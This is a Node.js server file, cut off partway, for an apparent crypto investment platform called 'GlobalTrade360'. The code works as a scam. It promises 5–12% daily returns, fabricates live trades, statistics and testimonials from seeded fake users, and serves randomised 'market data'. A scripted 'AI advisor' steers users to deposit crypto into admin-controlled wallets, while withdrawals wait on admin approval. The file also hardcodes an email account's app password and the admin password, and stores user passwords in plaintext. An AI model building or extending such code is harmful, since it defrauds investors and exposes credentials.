// ===================================================
// GLOBALTRADE360 - COMPLETE AI TRADING PLATFORM
// ===================================================

const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ========== CONFIGURATION ==========
const CONFIG = {
  PLATFORM_NAME: "GlobalTrade360",
  SUPPORT_EMAIL: "support@globaltrade360.com",
  ADMIN_EMAIL: "stevenlogan362@gmail.com",
  ADMIN_USERNAME: "globaltrade360",
  ADMIN_PASSWORD: "myhandwork2025",
  EMAIL_USER: "stevenlogan362@gmail.com",
  EMAIL_PASS: "ezdftcffuatisxel",
  
  // Platform settings
  MIN_DEPOSIT: 100,
  MIN_WITHDRAWAL: 50,
  WELCOME_BONUS: 50,
  
  // Initial crypto addresses (admin can change)
  CRYPTO_ADDRESSES: {
    bitcoin: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    ethereum: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
    usdt: "TNS1V6WVLkQRL2VQGP1C7nKFQZ0Gq9Zq1e",
    bnb: "bnb1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjxsnw2"
  }
};

// ========== MIDDLEWARE ==========
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ========== DATABASE ==========
const DB_FILE = path.join(__dirname, 'database.json');

function initDatabase() {
  if (!fs.existsSync(DB_FILE)) {
    const initialData = {
      users: [
        {
          id: 1001,
          name: "Michael Rodriguez",
          email: "michael@example.com",
          username: "michaelr",
          password: "Test123!",
          phone: "+12345678901",
          balance: 28500.00,
          totalDeposited: 30000.00,
          totalWithdrawn: 1500.00,
          country: "United States",
          city: "New York",
          joined: "2024-01-15T10:30:00.000Z",
          lastLogin: new Date().toISOString(),
          verified: true,
          kyc: "verified",
          isAdmin: false,
          photo: "https://randomuser.me/api/portraits/men/32.jpg",
          investments: [
            {
              id: 1,
              plan: "Professional",
              amount: 15000,
              dailyRate: 8.5,
              duration: 45,
              startDate: "2024-01-20T09:15:00.000Z",
              endDate: "2024-03-06T09:15:00.000Z",
              active: true,
              totalProfit: 6375.00,
              dailyProfit: 1275.00
            }
          ],
          transactions: [
            {
              id: "TXN1001",
              type: "deposit",
              amount: 15000,
              status: "completed",
              date: "2024-01-18T14:30:00.000Z",
              method: "Bitcoin"
            },
            {
              id: "TXN1002",
              type: "profit",
              amount: 1275,
              status: "completed",
              date: new Date().toISOString(),
              method: "Daily Earnings"
            }
          ]
        },
        {
          id: 1002,
          name: "Sarah Chen",
          email: "sarah@example.com",
          username: "sarahc",
          password: "Test123!",
          phone: "+6581234567",
          balance: 18200.00,
          totalDeposited: 20000.00,
          totalWithdrawn: 1800.00,
          country: "Singapore",
          city: "Singapore",
          joined: "2024-01-10T08:45:00.000Z",
          lastLogin: new Date().toISOString(),
          verified: true,
          kyc: "verified",
          isAdmin: false,
          photo: "https://randomuser.me/api/portraits/women/44.jpg",
          investments: [
            {
              id: 2,
              plan: "VIP",
              amount: 10000,
              dailyRate: 12,
              duration: 60,
              startDate: "2024-01-12T11:20:00.000Z",
              endDate: "2024-03-13T11:20:00.000Z",
              active: true,
              totalProfit: 4800.00,
              dailyProfit: 1200.00
            }
          ],
          transactions: [
            {
              id: "TXN1003",
              type: "deposit",
              amount: 10000,
              status: "completed",
              date: "2024-01-11T16:45:00.000Z",
              method: "Ethereum"
            }
          ]
        },
        {
          id: 1003,
          name: "James Wilson",
          email: "james@example.com",
          username: "jamesw",
          password: "Test123!",
          phone: "+441234567890",
          balance: 32500.00,
          totalDeposited: 35000.00,
          totalWithdrawn: 2500.00,
          country: "United Kingdom",
          city: "London",
          joined: "2023-12-05T13:20:00.000Z",
          lastLogin: new Date().toISOString(),
          verified: true,
          kyc: "verified",
          isAdmin: false,
          photo: "https://randomuser.me/api/portraits/men/67.jpg",
          investments: [
            {
              id: 3,
              plan: "Professional",
              amount: 20000,
              dailyRate: 8.5,
              duration: 45,
              startDate: "2023-12-10T10:15:00.000Z",
              endDate: "2024-01-24T10:15:00.000Z",
              active: true,
              totalProfit: 8500.00,
              dailyProfit: 1700.00
            }
          ],
          transactions: [
            {
              id: "TXN1004",
              type: "deposit",
              amount: 20000,
              status: "completed",
              date: "2023-12-08T09:30:00.000Z",
              method: "USDT"
            }
          ]
        }
      ],
      admin: {
        username: CONFIG.ADMIN_USERNAME,
        password: CONFIG.ADMIN_PASSWORD,
        email: CONFIG.ADMIN_EMAIL,
        fullName: "Steven Logan",
        lastLogin: null,
        photo: "https://randomuser.me/api/portraits/men/75.jpg"
      },
      cryptoAddresses: CONFIG.CRYPTO_ADDRESSES,
      platformStats: {
        totalUsers: 156,
        activeUsers: 124,
        totalInvestments: 289,
        totalVolume: 2850000.00,
        totalProfitPaid: 856000.00,
        successRate: 98.7,
        liveTrades: [],
        updatedAt: new Date().toISOString()
      },
      messages: [],
      depositRequests: [],
      withdrawalRequests: [],
      investmentPlans: [
        {
          id: 1,
          name: "Basic",
          dailyRate: 5,
          duration: 30,
          minAmount: 100,
          maxAmount: 1000,
          features: ["Capital Return", "24/7 Support", "Basic AI Signals", "Email Support"]
        },
        {
          id: 2,
          name: "Professional",
          dailyRate: 8.5,
          duration: 45,
          minAmount: 1000,
          maxAmount: 10000,
          features: ["Capital Return", "Priority Support", "Advanced AI Signals", "Risk Management", "Phone Support"]
        },
        {
          id: 3,
          name: "VIP",
          dailyRate: 12,
          duration: 60,
          minAmount: 10000,
          maxAmount: 100000,
          features: ["Capital Return", "Personal Manager", "Premium AI Tools", "Instant Withdrawals", "24/7 Phone Support"]
        }
      ]
    };
    
    fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
    console.log("✅ Professional database initialized");
  }
}

function readDB() {
  try {
    const data = fs.readFileSync(DB_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    initDatabase();
    return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
  }
}

function writeDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// ========== EMAIL SERVICE ==========
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: CONFIG.EMAIL_USER,
    pass: CONFIG.EMAIL_PASS
  }
});

async function sendEmail(to, subject, html) {
  try {
    await transporter.sendMail({
      from: `"${CONFIG.PLATFORM_NAME}" <${CONFIG.EMAIL_USER}>`,
      to: to,
      subject: subject,
      html: html
    });
    return true;
  } catch (error) {
    console.log("Email error:", error.message);
    return false;
  }
}

// ========== ROUTES ==========

// Serve main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Get platform data
app.get('/api/platform-data', (req, res) => {
  const db = readDB();
  
  // Generate live trades
  const liveTrades = [
    { user: "John D.", amount: 1250, profit: 106.25, time: "2 min ago", type: "BTC/USD", status: "success" },
    { user: "Sarah M.", amount: 3500, profit: 297.50, time: "5 min ago", type: "ETH/USD", status: "success" },
    { user: "Mike R.", amount: 750, profit: 63.75, time: "8 min ago", type: "EUR/USD", status: "success" },
    { user: "Lisa K.", amount: 5200, profit: 442.00, time: "12 min ago", type: "GOLD", status: "success" },
    { user: "David T.", amount: 2100, profit: 178.50, time: "15 min ago", type: "XRP/USD", status: "success" }
  ];
  
  db.platformStats.liveTrades = liveTrades;
  db.platformStats.updatedAt = new Date().toISOString();
  writeDB(db);
  
  res.json({
    success: true,
    platform: {
      name: CONFIG.PLATFORM_NAME,
      stats: db.platformStats,
      liveTrades: liveTrades,
      testimonials: db.users.slice(0, 3).map(user => ({
        name: user.name,
        photo: user.photo,
        country: user.country,
        profit: user.investments.reduce((sum, inv) => sum + (inv.totalProfit || 0), 0),
        text: `Earned $${user.investments.reduce((sum, inv) => sum + (inv.totalProfit || 0), 0).toLocaleString()} in profits!`
      }))
    }
  });
});

// User registration
app.post('/api/register', async (req, res) => {
  try {
    const { name, email, username, password, phone, country } = req.body;
    const db = readDB();
    
    // Validation
    if (!name || !email || !username || !password) {
      return res.status(400).json({ error: 'All required fields must be filled' });
    }
    
    // Check if user exists
    if (db.users.some(u => u.email === email)) {
      return res.status(400).json({ error: 'Email already registered' });
    }
    if (db.users.some(u => u.username === username)) {
      return res.status(400).json({ error: 'Username already taken' });
    }
    
    // Create new user
    const newUser = {
      id: Date.now(),
      name,
      email,
      username,
      password,
      phone: phone || '',
      country: country || '',
      balance: CONFIG.WELCOME_BONUS,
      totalDeposited: 0,
      totalWithdrawn: 0,
      investments: [],
      transactions: [],
      joined: new Date().toISOString(),
      lastLogin: null,
      verified: false,
      kyc: "pending",
      isAdmin: false,
      photo: `https://randomuser.me/api/portraits/${Math.random() > 0.5 ? 'men' : 'women'}/${Math.floor(Math.random() * 99)}.jpg`
    };
    
    db.users.push(newUser);
    db.platformStats.totalUsers = db.users.length;
    writeDB(db);
    
    // Send welcome email
    await sendEmail(
      email,
      `Welcome to ${CONFIG.PLATFORM_NAME}!`,
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 10px;">
        <h2 style="text-align: center; color: #FFD700;">🎉 Welcome to ${CONFIG.PLATFORM_NAME}, ${name}!</h2>
        <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin: 20px 0; backdrop-filter: blur(10px);">
          <h3 style="color: #FFD700;">Account Created Successfully!</h3>
          <p><strong>$${CONFIG.WELCOME_BONUS} Welcome Bonus</strong> has been credited to your account.</p>
          <p><strong>Username:</strong> ${username}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Account Balance:</strong> $${CONFIG.WELCOME_BONUS}.00</p>
        </div>
        <p style="text-align: center;">Start your investment journey now with our AI-powered trading platform!</p>
        <div style="text-align: center; margin: 30px 0;">
          <a href="${req.headers.origin}" style="background: #FFD700; color: #000; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Go to Dashboard</a>
        </div>
        <p style="color: rgba(255,255,255,0.7); font-size: 12px; text-align: center;">
          If you didn't create this account, please contact support immediately.<br>
          <strong>${CONFIG.PLATFORM_NAME} Team</strong><br>
          Email: ${CONFIG.SUPPORT_EMAIL}
        </p>
      </div>
      `
    );
    
    // Notify admin
    await sendEmail(
      CONFIG.ADMIN_EMAIL,
      `New User Registration - ${name}`,
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 10px;">
        <h2 style="color: #D4AF37;">📈 New User Registered</h2>
        <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #D4AF37;">
          <p><strong>Name:</strong> ${name}</p>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Username:</strong> ${username}</p>
          <p><strong>Country:</strong> ${country || 'Not specified'}</p>
          <p><strong>Date:</strong> ${new Date().toLocaleString()}</p>
        </div>
        <p>Total users: ${db.users.length}</p>
      </div>
      `
    );
    
    res.json({
      success: true,
      message: `Registration successful! $${CONFIG.WELCOME_BONUS} bonus added to your account.`,
      user: {
        id: newUser.id,
        name: newUser.name,
        email: newUser.email,
        username: newUser.username,
        balance: newUser.balance,
        photo: newUser.photo,
        isAdmin: false
      }
    });
    
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Registration failed. Please try again.' });
  }
});

// User login
app.post('/api/login', (req, res) => {
  try {
    const { username, password } = req.body;
    const db = readDB();
    
    // Check admin login
    if (username === db.admin.username && password === db.admin.password) {
      db.admin.lastLogin = new Date().toISOString();
      writeDB(db);
      
      return res.json({
        success: true,
        isAdmin: true,
        user: {
          username: db.admin.username,
          email: db.admin.email,
          fullName: db.admin.fullName,
          photo: db.admin.photo,
          isAdmin: true
        }
      });
    }
    
    // Check user login
    const user = db.users.find(u => 
      (u.username === username || u.email === username) && 
      u.password === password
    );
    
    if (user) {
      // Update last login
      user.lastLogin = new Date().toISOString();
      writeDB(db);
      
      // Calculate profits
      user.investments.forEach(inv => {
        if (inv.active) {
          const daysActive = Math.floor((Date.now() - new Date(inv.startDate).getTime()) / (1000 * 60 * 60 * 24));
          inv.currentProfit = inv.amount * (inv.dailyRate / 100) * daysActive;
          inv.dailyProfit = inv.amount * (inv.dailyRate / 100);
        }
      });
      
      res.json({
        success: true,
        isAdmin: false,
        user: {
          id: user.id,
          name: user.name,
          email: user.email,
          username: user.username,
          balance: user.balance,
          photo: user.photo,
          totalDeposited: user.totalDeposited,
          totalWithdrawn: user.totalWithdrawn,
          investments: user.investments,
          transactions: user.transactions,
          country: user.country,
          joined: user.joined,
          kyc: user.kyc,
          verified: user.verified,
          isAdmin: false
        }
      });
    } else {
      res.status(401).json({
        success: false,
        error: 'Invalid username/email or password'
      });
    }
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed. Please try again.' });
  }
});

// Get user data
app.get('/api/user/:id', (req, res) => {
  try {
    const { id } = req.params;
    const db = readDB();
    const user = db.users.find(u => u.id == id);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    // Calculate profits
    user.investments.forEach(inv => {
      if (inv.active) {
        const daysActive = Math.floor((Date.now() - new Date(inv.startDate).getTime()) / (1000 * 60 * 60 * 24));
        inv.currentProfit = inv.amount * (inv.dailyRate / 100) * daysActive;
        inv.dailyProfit = inv.amount * (inv.dailyRate / 100);
      }
    });
    
    res.json({
      success: true,
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        username: user.username,
        photo: user.photo,
        balance: user.balance,
        investments: user.investments,
        transactions: user.transactions,
        totalDeposited: user.totalDeposited,
        totalWithdrawn: user.totalWithdrawn,
        country: user.country,
        city: user.city,
        phone: user.phone,
        joined: user.joined,
        kyc: user.kyc,
        verified: user.verified
      }
    });
  } catch (error) {
    console.error('Get user error:', error);
    res.status(500).json({ error: 'Failed to get user data' });
  }
});

// Submit deposit request
app.post('/api/deposit-request', async (req, res) => {
  try {
    const { userId, amount, cryptoType } = req.body;
    const db = readDB();
    const user = db.users.find(u => u.id == userId);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    const depositAmount = parseFloat(amount);
    if (isNaN(depositAmount) || depositAmount < CONFIG.MIN_DEPOSIT) {
      return res.status(400).json({ error: `Minimum deposit is $${CONFIG.MIN_DEPOSIT}` });
    }
    
    // Get crypto address
    const cryptoAddress = db.cryptoAddresses[cryptoType.toLowerCase()];
    if (!cryptoAddress) {
      return res.status(400).json({ error: 'Invalid cryptocurrency selected' });
    }
    
    // Create deposit request
    const depositRequest = {
      id: 'DEP' + Date.now(),
      userId: userId,
      userName: user.name,
      userEmail: user.email,
      amount: depositAmount,
      cryptoType: cryptoType,
      address: cryptoAddress,
      status: 'pending',
      date: new Date().toISOString(),
      adminAction: null,
      adminActionDate: null
    };
    
    db.depositRequests.push(depositRequest);
    writeDB(db);
    
    // Send email to user
    await sendEmail(
      user.email,
      'Deposit Request Submitted - GlobalTrade360',
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 10px;">
        <h2 style="color: #D4AF37; text-align: center;">Deposit Request Submitted</h2>
        <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #28a745;">
          <h3>Deposit Details</h3>
          <p><strong>Amount:</strong> $${depositAmount}</p>
          <p><strong>Cryptocurrency:</strong> ${cryptoType.toUpperCase()}</p>
          <p><strong>Deposit Address:</strong></p>
          <div style="background: #e9ecef; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all;">
            ${cryptoAddress}
          </div>
          <p><strong>Status:</strong> Pending Admin Approval</p>
          <p><strong>Transaction ID:</strong> ${depositRequest.id}</p>
        </div>
        <p>Send exactly $${depositAmount} worth of ${cryptoType.toUpperCase()} to the address above.</p>
        <p>Your deposit will be processed after 3 network confirmations and admin approval.</p>
        <div style="text-align: center; margin: 30px 0;">
          <a href="${req.headers.origin}" style="background: #D4AF37; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold;">View Status</a>
        </div>
      </div>
      `
    );
    
    // Notify admin
    await sendEmail(
      CONFIG.ADMIN_EMAIL,
      `New Deposit Request - $${depositAmount} - ${user.name}`,
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #fff3cd; border-radius: 10px; border-left: 4px solid #ffc107;">
        <h2 style="color: #856404;">💰 New Deposit Request</h2>
        <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
          <p><strong>User:</strong> ${user.name} (${user.username})</p>
          <p><strong>Email:</strong> ${user.email}</p>
          <p><strong>Amount:</strong> $${depositAmount}</p>
          <p><strong>Cryptocurrency:</strong> ${cryptoType.toUpperCase()}</p>
          <p><strong>Deposit Address:</strong> ${cryptoAddress}</p>
          <p><strong>Transaction ID:</strong> ${depositRequest.id}</p>
          <p><strong>Date:</strong> ${new Date().toLocaleString()}</p>
        </div>
        <p>Please approve this deposit request in the admin panel after confirming the transaction.</p>
      </div>
      `
    );
    
    res.json({
      success: true,
      message: 'Deposit request submitted. Send cryptocurrency to the provided address.',
      request: depositRequest,
      address: cryptoAddress
    });
    
  } catch (error) {
    console.error('Deposit request error:', error);
    res.status(500).json({ error: 'Deposit request failed' });
  }
});

// Submit withdrawal request
app.post('/api/withdraw-request', async (req, res) => {
  try {
    const { userId, amount, walletAddress } = req.body;
    const db = readDB();
    const user = db.users.find(u => u.id == userId);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    const withdrawAmount = parseFloat(amount);
    if (isNaN(withdrawAmount) || withdrawAmount < CONFIG.MIN_WITHDRAWAL) {
      return res.status(400).json({ error: `Minimum withdrawal is $${CONFIG.MIN_WITHDRAWAL}` });
    }
    
    if (user.balance < withdrawAmount) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    // Create withdrawal request
    const withdrawalRequest = {
      id: 'WTH' + Date.now(),
      userId: userId,
      userName: user.name,
      userEmail: user.email,
      amount: withdrawAmount,
      walletAddress: walletAddress,
      status: 'pending',
      date: new Date().toISOString(),
      adminAction: null,
      adminActionDate: null
    };
    
    db.withdrawalRequests.push(withdrawalRequest);
    writeDB(db);
    
    // Send email to user
    await sendEmail(
      user.email,
      'Withdrawal Request Submitted - GlobalTrade360',
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 10px;">
        <h2 style="color: #D4AF37; text-align: center;">Withdrawal Request Submitted</h2>
        <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #28a745;">
          <h3>Withdrawal Details</h3>
          <p><strong>Amount:</strong> $${withdrawAmount}</p>
          <p><strong>Wallet Address:</strong> ${walletAddress.substring(0, 20)}...</p>
          <p><strong>Status:</strong> Pending Admin Approval</p>
          <p><strong>Transaction ID:</strong> ${withdrawalRequest.id}</p>
          <p><strong>Processing Time:</strong> 2-24 hours after approval</p>
        </div>
        <p>Your withdrawal request has been received and is pending admin approval.</p>
        <p>You will receive an email notification once your request is processed.</p>
        <div style="text-align: center; margin: 30px 0;">
          <a href="${req.headers.origin}" style="background: #D4AF37; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold;">Track Status</a>
        </div>
      </div>
      `
    );
    
    res.json({
      success: true,
      message: 'Withdrawal request submitted. Pending admin approval.',
      request: withdrawalRequest
    });
    
  } catch (error) {
    console.error('Withdrawal request error:', error);
    res.status(500).json({ error: 'Withdrawal request failed' });
  }
});

// Create investment
app.post('/api/invest', (req, res) => {
  try {
    const { userId, plan, amount } = req.body;
    const db = readDB();
    const user = db.users.find(u => u.id == userId);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    const investmentAmount = parseFloat(amount);
    
    // Check balance
    if (user.balance < investmentAmount) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    // Get plan details
    const planDetails = db.investmentPlans.find(p => p.name.toLowerCase() === plan.toLowerCase());
    if (!planDetails) {
      return res.status(400).json({ error: 'Invalid investment plan' });
    }
    
    // Check amount limits
    if (investmentAmount < planDetails.minAmount) {
      return res.status(400).json({ error: `Minimum for ${plan} plan is $${planDetails.minAmount}` });
    }
    if (investmentAmount > planDetails.maxAmount) {
      return res.status(400).json({ error: `Maximum for ${plan} plan is $${planDetails.maxAmount}` });
    }
    
    // Deduct from balance
    user.balance -= investmentAmount;
    
    // Create investment
    const investment = {
      id: Date.now(),
      plan: planDetails.name,
      amount: investmentAmount,
      dailyRate: planDetails.dailyRate,
      duration: planDetails.duration,
      startDate: new Date().toISOString(),
      endDate: new Date(Date.now() + planDetails.duration * 24 * 60 * 60 * 1000).toISOString(),
      active: true,
      totalProfit: 0,
      dailyProfit: (investmentAmount * planDetails.dailyRate) / 100
    };
    
    user.investments.push(investment);
    db.platformStats.totalInvestments++;
    writeDB(db);
    
    // Send investment confirmation email
    sendEmail(
      user.email,
      'New Investment Created - GlobalTrade360',
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 10px;">
        <h2 style="color: #D4AF37; text-align: center;">🎯 Investment Created Successfully</h2>
        <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #28a745;">
          <h3>Investment Details</h3>
          <p><strong>Plan:</strong> ${planDetails.name}</p>
          <p><strong>Amount:</strong> $${investmentAmount}</p>
          <p><strong>Daily Rate:</strong> ${planDetails.dailyRate}%</p>
          <p><strong>Duration:</strong> ${planDetails.duration} days</p>
          <p><strong>Daily Profit:</strong> $${((investmentAmount * planDetails.dailyRate) / 100).toFixed(2)}</p>
          <p><strong>Total Return:</strong> $${(investmentAmount + ((investmentAmount * planDetails.dailyRate) / 100) * planDetails.duration).toFixed(2)}</p>
        </div>
        <p>Your investment is now active and earning profits daily!</p>
        <div style="text-align: center; margin: 30px 0;">
          <a href="${req.headers.origin}" style="background: #D4AF37; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold;">View Investment</a>
        </div>
      </div>
      `
    );
    
    res.json({
      success: true,
      message: `Investment created in ${planDetails.name} plan`,
      investment: investment,
      newBalance: user.balance
    });
    
  } catch (error) {
    console.error('Investment error:', error);
    res.status(500).json({ error: 'Investment creation failed' });
  }
});

// AI Chat
app.post('/api/ai-chat', async (req, res) => {
  try {
    const { userId, message } = req.body;
    const db = readDB();
    const user = db.users.find(u => u.id == userId);
    
    const responses = {
      deposit: `To deposit funds:<br>
      1. Go to <strong>Deposit</strong> section in your dashboard<br>
      2. Select cryptocurrency (BTC, ETH, USDT, BNB)<br>
      3. Send exact amount to provided address<br>
      4. Wait for admin approval (2-24 hours)<br>
      <br>
      <strong>Current Deposit Addresses:</strong><br>
      Bitcoin: ${db.cryptoAddresses.bitcoin}<br>
      Ethereum: ${db.cryptoAddresses.ethereum}<br>
      USDT: ${db.cryptoAddresses.usdt}<br>
      BNB: ${db.cryptoAddresses.bnb}<br>
      <br>
      Minimum deposit: $${CONFIG.MIN_DEPOSIT}`,
      
      profit: `Our investment plans offer excellent returns:<br><br>
      <strong>Basic Plan:</strong> 5% daily for 30 days (150% total)<br>
      <strong>Professional Plan:</strong> 8.5% daily for 45 days (382.5% total)<br>
      <strong>VIP Plan:</strong> 12% daily for 60 days (720% total)<br><br>
      All plans include capital return. Current AI analysis recommends Professional Plan for optimal risk/reward balance.`,
      
      withdraw: `Withdrawal process:<br>
      1. Ensure minimum balance: $${CONFIG.MIN_WITHDRAWAL}<br>
      2. Go to <strong>Withdraw</strong> section<br>
      3. Enter amount and wallet address<br>
      4. Submit request (pending admin approval)<br>
      5. Processing time: 2-24 hours after approval<br><br>
      For urgent withdrawals, contact support directly.`,
      
      support: `For support, contact:<br>
      <strong>Email:</strong> ${CONFIG.SUPPORT_EMAIL}<br>
      <strong>Response Time:</strong> 1-4 hours<br><br>
      Include your username and detailed description for faster assistance. For account-related issues, please provide your user ID.`,
      
      bitcoin: `Bitcoin (BTC) Analysis:<br>
      • Current Trend: <strong>Bullish</strong><br>
      • Support Level: $45,000<br>
      • Resistance: $48,500<br>
      • Target: $55,000 (2-3 weeks)<br>
      • RSI: 58 (Neutral-Bullish)<br>
      • MACD: Bullish crossover imminent<br><br>
      Recommendation: Accumulate between $45K-$47K.`,
      
      default: `I'm your AI Trading Advisor! I can help with:<br><br>
      • <strong>Investment advice</strong> and plan recommendations<br>
      • <strong>Deposit/withdrawal</strong> instructions<br>
      • <strong>Market analysis</strong> (BTC, ETH, Forex, Gold)<br>
      • <strong>Trading signals</strong> and technical analysis<br>
      • <strong>Account support</strong> and platform guidance<br><br>
      What would you like to know about?`
    };
    
    const msg = message.toLowerCase();
    let response = responses.default;
    
    if (msg.includes('deposit') || msg.includes('fund') || msg.includes('add money')) response = responses.deposit;
    else if (msg.includes('profit') || msg.includes('earn') || msg.includes('return') || msg.includes('interest')) response = responses.profit;
    else if (msg.includes('withdraw') || msg.includes('cash out') || msg.includes('withdrawal')) response = responses.withdraw;
    else if (msg.includes('support') || msg.includes('help') || msg.includes('contact') || msg.includes('issue')) response = responses.support;
    else if (msg.includes('bitcoin') || msg.includes('btc') || msg.includes('crypto')) response = responses.bitcoin;
    else if (msg.includes('ethereum') || msg.includes('eth')) response = response.replace('Bitcoin', 'Ethereum').replace('BTC', 'ETH').replace('$45K', '$2,300');
    else if (msg.includes('market') || msg.includes('trade') || msg.includes('forex')) response = "Current market conditions favor bullish trends. EUR/USD showing strength, GBP/USD consolidating. Gold at key support $2,030. Crypto market entering accumulation phase.";
    
    // Store message
    const chatMessage = {
      id: Date.now(),
      userId: userId,
      userName: user ? user.name : 'Guest',
      message: message,
      response: response,
      timestamp: new Date().toISOString(),
      status: 'unread'
    };
    
    db.messages.push(chatMessage);
    writeDB(db);
    
    res.json({
      success: true,
      response: response
    });
    
  } catch (error) {
    console.error('AI chat error:', error);
    res.status(500).json({ error: 'AI service unavailable' });
  }
});

// Get crypto addresses
app.get('/api/crypto-addresses', (req, res) => {
  const db = readDB();
  res.json({
    success: true,
    addresses: db.cryptoAddresses
  });
});

// Get market data
app.get('/api/market-data', (req, res) => {
  const marketData = {
    btc: { price: 45218.50 + (Math.random() * 1000 - 500), change: 2.3 + (Math.random() - 0.5), symbol: "BTC/USD" },
    eth: { price: 2415.75 + (Math.random() * 100 - 50), change: 1.8 + (Math.random() - 0.3), symbol: "ETH/USD" },
    xrp: { price: 0.6245 + (Math.random() * 0.1 - 0.05), change: -0.5 + (Math.random() - 0.5), symbol: "XRP/USD" },
    bnb: { price: 312.45 + (Math.random() * 20 - 10), change: 1.2 + (Math.random() - 0.4), symbol: "BNB/USD" },
    sol: { price: 98.75 + (Math.random() * 10 - 5), change: 3.1 + (Math.random() - 0.6), symbol: "SOL/USD" },
    eur_usd: { price: 1.0850 + (Math.random() * 0.01 - 0.005), change: 0.2 + (Math.random() - 0.5), symbol: "EUR/USD" },
    gbp_usd: { price: 1.2650 + (Math.random() * 0.01 - 0.005), change: 0.1 + (Math.random() - 0.5), symbol: "GBP/USD" },
    gold: { price: 2034.50 + (Math.random() * 10 - 5), change: 0.8 + (Math.random() - 0.5), symbol: "GOLD" }
  };
  
  res.json({ success: true, data: marketData });
});

// ========== ADMIN ROUTES ==========

// Admin middleware
function verifyAdmin(req, res, next) {
  const { adminKey } = req.query;
  
  if (adminKey === CONFIG.ADMIN_PASSWORD) {
    next();
  } else {
    res.status(403).json({ error: 'Unauthorized admin access' });
  }
}

// Get all users (admin)
app.get('/api/admin/users', verifyAdmin, (req, res) => {
  try {
    const db = readDB();
    
    const users = db.users.map(user => ({
      id: user.id,
      name: user.name,
      email: user.email,
      username: user.username,
      photo: user.photo,
      balance: user.balance,
      totalDeposited: user.totalDeposited,
      totalWithdrawn: user.totalWithdrawn,
      investments: user.investments.length,
      country: user.country,
      city: user.city,
      phone: user.phone,
      joined: user.joined,
      lastLogin: user.lastLogin,
      kyc: user.kyc,
      verified: user.verified,
      isActive: true
    }));
    
    res.json({
      success: true,
      users: users,
      total: users.length
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch users' });
  }
});

// Update crypto addresses (admin)
app.post('/api/admin/update-crypto', verifyAdmin, (req, res) => {
  try {
    const { bitcoin, ethereum, usdt, bnb } = req.body;
    const db = readDB();
    
    db.cryptoAddresses = {
      bitcoin: bitcoin || db.cryptoAddresses.bitcoin,
      ethereum: ethereum || db.cryptoAddresses.ethereum,
      usdt: usdt || db.cryptoAddresses.usdt,
      bnb: bnb || db.cryptoAddresses.bnb,
      updatedAt: new Date().toISOString(),
      updatedBy: 'admin'
    };
    
    writeDB(db);
    
    // Send notification to all users about address change
    db.users.forEach(user => {
      sendEmail(
        user.email,
        'Important: Crypto Deposit Addresses Updated',
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #fff3cd; border-radius: 10px; border-left: 4px solid #ffc107;">
          <h2 style="color: #856404;">⚠️ Important Notice</h2>
          <p>Dear ${user.name},</p>
          <p>Our cryptocurrency deposit addresses have been updated for enhanced security.</p>
          <div style="background: white; padding: 15px; border-radius: 5px; margin: 15px 0;">
            <p><strong>New Deposit Addresses:</strong></p>
            <p>Bitcoin: ${db.cryptoAddresses.bitcoin}</p>
            <p>Ethereum: ${db.cryptoAddresses.ethereum}</p>
            <p>USDT: ${db.cryptoAddresses.usdt}</p>
            <p>BNB: ${db.cryptoAddresses.bnb}</p>
          </div>
          <p>Please use these new addresses for all future deposits.</p>
